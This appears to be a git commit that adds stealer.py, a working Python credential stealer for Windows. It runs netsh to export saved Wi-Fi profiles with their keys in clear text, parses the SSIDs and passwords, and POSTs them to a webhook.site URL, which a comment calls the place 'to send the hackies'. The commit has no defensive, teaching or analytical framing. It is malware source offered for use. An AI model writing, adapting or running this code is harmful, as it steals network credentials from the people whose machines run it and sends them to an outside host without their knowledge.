9e8652420c9c96c6d627437cd5452bdddae749aa
muntasir019 <142436389+muntasir019@users.noreply.github.com>
2024-01-31 21:28:39 +0600

    Initial commit

---
+++ stealer.py
@@ -0,0 +1,63 @@
+import subprocess
+import os
+import requests
+import xml.etree.ElementTree as ET
+
+#url to send the hackies
+url = "https://webhook.site/ecc6f5af-76f5-407c-bf23-6f121de83d6d"
+
+# Function to extract Wi-Fi credentials
+def extract_wifi_credentials():
+    try:
+        # Execute windows commands
+        command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()
+
+        # Grab the directory where the script is located
+        script_directory = os.path.dirname(os.path.abspath(__file__))
+
+        # Lists
+        SSID = []
+        password = []
+
+        # Loop through Wi-Fi files
+        for filename in os.listdir(script_directory):
+            if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
+                file_path = os.path.join(script_directory, filename)
+                tree = ET.parse(file_path)
+                root = tree.getroot()
+
+                # Find the name under the WLANProfile element
+                wlan_name = root.find(".//{http://www.microsoft.com/networking/WLAN/profile/v1}name").text
+
+                with open(file_path, "r") as f:
+                    f_lines = f.readlines()
+                    for line in f_lines:
+                        if "<keyMaterial>" in line:
+                            pass_line = line.strip()[13:-14]
+                            password.append(pass_line)
+
+                SSID.append(wlan_name)
+
+        # Print or log extracted credentials
+        for x, y in zip(SSID, password):
+            print(f"SSID: {x}, Password: {y}")
+
+        # Send credentials to the specified URL
+        send_credentials(SSID, password)
+
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+
+# Function to send credentials to the specified URL
+def send_credentials(SSID, password):
+    try:
+        payload = {"SSID": SSID, "password": password}
+        response = requests.post(url, json=payload)
+
+        print(f"Credentials sent. Response: {response.text}")
+
+    except Exception as e:
+        print(f"Error sending credentials: {str(e)}")
+
+# Run the script
+extract_wifi_credentials()
